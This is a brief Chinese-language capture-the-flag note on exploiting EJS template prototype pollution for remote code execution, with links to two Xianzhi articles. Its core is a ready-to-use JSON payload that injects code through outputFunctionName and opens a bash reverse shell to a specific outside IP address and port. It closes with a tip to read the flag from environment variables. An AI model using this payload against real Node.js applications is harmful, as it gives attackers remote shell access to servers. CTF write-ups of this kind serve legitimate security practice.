# 知识点
ejs rce<br />[再探 JavaScript 原型链污染到 RCE - 先知社区](https://xz.aliyun.com/t/7025)<br />[ejs原型污染rce分析 - 先知社区](https://xz.aliyun.com/t/7075)
# 思路
引入了ejs作为模板
```php
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/101.43.225.132/9999 0>&1\"');var __tmp2"}}}
```
输入env可以获取flag环境变量
